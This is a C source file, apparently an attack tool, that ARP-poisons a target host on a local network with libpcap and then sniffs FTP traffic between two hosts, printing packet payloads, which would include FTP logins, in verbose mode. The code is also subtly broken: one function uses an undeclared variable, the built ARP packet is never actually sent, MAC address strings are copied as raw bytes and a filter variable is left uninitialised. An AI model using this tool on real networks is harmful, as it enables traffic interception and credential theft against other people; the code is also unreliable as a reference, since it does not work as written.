#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#define MAX_PACKET_SIZE 65536

void restore_arp_table(const char *interface, const char *ip_address, const char *mac_address) {
    struct arpreq req;
    struct sockaddr_in *sin;
    int sockfd;

    memset(&req, 0, sizeof(req));
    sin = (struct sockaddr_in *)&req.arp_pa;
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, ip_address, &(sin->sin_addr));

    strncpy(req.arp_dev, interface, sizeof(req.arp_dev) - 1);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

    if (ioctl(sockfd, SIOCDARP, &req) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(1);
    }

    struct ether_arp arp_packet;
    memset(&arp_packet, 0, sizeof(arp_packet));

    arp_packet.arp_hrd = htons(ARPHRD_ETHER);
    arp_packet.arp_pro = htons(ETHERTYPE_IP);
    arp_packet.arp_hln = ETHER_ADDR_LEN;
    arp_packet.arp_pln = sizeof(struct in_addr);
    arp_packet.arp_op = htons(ARPOP_REPLY);

    struct ether_header eth_header;
    memset(&eth_header, 0, sizeof(eth_header));

    eth_header.ether_type = htons(ETHERTYPE_ARP);
    memcpy(eth_header.ether_dhost, mac_address, ETHER_ADDR_LEN);
    memcpy(eth_header.ether_shost, mac_address, ETHER_ADDR_LEN);

    struct pcap_pkthdr pkt_header;
    memset(&pkt_header, 0, sizeof(pkt_header));

    pcap_t *handle = pcap_open_live(interface, MAX_PACKET_SIZE, 1, 1000, NULL);
    if (handle == NULL) {
        printf("Error opening device\n");
        exit(1);
    }

    int i;
    for (i = 0; i < 3; i++) {
        arp_packet.arp_spa = sin->sin_addr;
        memcpy(arp_packet.arp_sha, mac_address, ETHER_ADDR_LEN);
        memcpy(arp_packet.arp_tha, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN);

        if (pcap_sendpacket(handle, (const u_char *)&eth_header, sizeof(eth_header)) != 0) {
            printf("Error sending ARP packet\n");
            exit(1);
        }

        sleep(1);
    }

    pcap_close(handle);
}

void arp_poisoning(const char *interface, const char *ip_address, const char *mac_address, const char *target_ip, const char *target_mac) {
    struct arpreq req;
    struct sockaddr_in *sin;
    int sockfd;

    memset(&req, 0, sizeof(req));
    sin = (struct sockaddr_in *)&req.arp_pa;
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &(sin->sin_addr));

    strncpy(req.arp_dev, interface, sizeof(req.arp_dev) - 1);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

    if (ioctl(sockfd, SIOCGARP, &req) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(1);
    }

    struct ether_arp arp_packet;
    memset(&arp_packet, 0, sizeof(arp_packet));

    arp_packet.arp_hrd = htons(ARPHRD_ETHER);
    arp_packet.arp_pro = htons(ETHERTYPE_IP);
    arp_packet.arp_hln = ETHER_ADDR_LEN;
    arp_packet.arp_pln = sizeof(struct in_addr);
    arp_packet.arp_op = htons(ARPOP_REPLY);

    struct ether_header eth_header;
    memset(&eth_header, 0, sizeof(eth_header));

    eth_header.ether_type = htons(ETHERTYPE_ARP);
    memcpy(eth_header.ether_dhost, target_mac, ETHER_ADDR_LEN);
    memcpy(eth_header.ether_shost, mac_address, ETHER_ADDR_LEN);

    struct pcap_pkthdr pkt_header;
    memset(&pkt_header, 0, sizeof(pkt_header));

    pcap_t *handle = pcap_open_live(interface, MAX_PACKET_SIZE, 1, 1000, NULL);
    if (handle == NULL) {
        printf("Error opening device\n");
        exit(1);
    }

    int i;
    for (i = 0; i < 3; i++) {
        arp_packet.arp_spa = sin->sin_addr;
        memcpy(arp_packet.arp_sha, mac_address, ETHER_ADDR_LEN);
        arp_packet.arp_tpa = ip_header->ip_src;
        memcpy(arp_packet.arp_tha, target_mac, ETHER_ADDR_LEN);

        if (pcap_sendpacket(handle, (const u_char *)&eth_header, sizeof(eth_header)) != 0) {
            printf("Error sending ARP packet\n");
            exit(1);
        }

        sleep(1);
    }

    pcap_close(handle);
}

void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    struct ether_header *eth_header = (struct ether_header *)packet;
    struct ip *ip_header = (struct ip *)(packet + sizeof(struct ether_header));
    struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct ether_header) + sizeof(struct ip));
    
    char *payload = (char *)(packet + sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct tcphdr));
    int payload_length = pkthdr->len - (sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct tcphdr));
    
    if (ntohs(eth_header->ether_type) == ETHERTYPE_IP && ip_header->ip_p == IPPROTO_TCP) {
        char src_ip[INET_ADDRSTRLEN];
        char dst_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(ip_header->ip_src), src_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(ip_header->ip_dst), dst_ip, INET_ADDRSTRLEN);
        
        if (ntohs(tcp_header->th_sport) == 21 || ntohs(tcp_header->th_dport) == 21) {
            printf("FTP Traffic:\n");
            printf("Source IP: %s\n", src_ip);
            printf("Destination IP: %s\n", dst_ip);
            
            if (user_data && strcmp((char *)user_data, "-v") == 0) {
                printf("Payload:\n");
                fwrite(payload, 1, payload_length, stdout);
                printf("\n");
            }
            
            printf("=================================\n");
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 5 || argc > 6) {
        printf("Invalid number of arguments\n");
        printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]\n", argv[0]);
        return 1;
    }
    
    const char *interface = "eth0";
    const char *ip_src = argv[1];
    const char *mac_src = argv[2];
    const char *ip_target = argv[3];
    const char *mac_target = argv[4];
    
    if (argc == 6 && strcmp(argv[5], "-v") == 0) {
        printf("Verbose mode enabled\n");
    }
    
    // ARP poisoning
    arp_poisoning(interface, ip_src, mac_src, ip_target, mac_target);
    
    // Set up packet capture
    char filter_exp[100];
    snprintf(filter_exp, sizeof(filter_exp), "host %s or host %s", ip_src, ip_target);
    
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    bpf_u_int32 net;
    
    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("Error opening device: %s\n", errbuf);
        return 1;
    }
    
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        printf("Error compiling filter: %s\n", pcap_geterr(handle));
        return 1;
    }
    
    if (pcap_setfilter(handle, &fp) == -1) {
        printf("Error setting filter: %s\n", pcap_geterr(handle));
        return 1;
    }
    
    // Capture packets and handle them
    pcap_loop(handle, -1, packet_handler, (u_char *)(argc == 6 ? argv[5] : NULL));
    
    // Restore ARP tables
    restore_arp_table(interface, ip_src, mac_src);
    restore_arp_table(interface, ip_target, mac_target);
    
    pcap_close(handle);
    
    return 0;
}

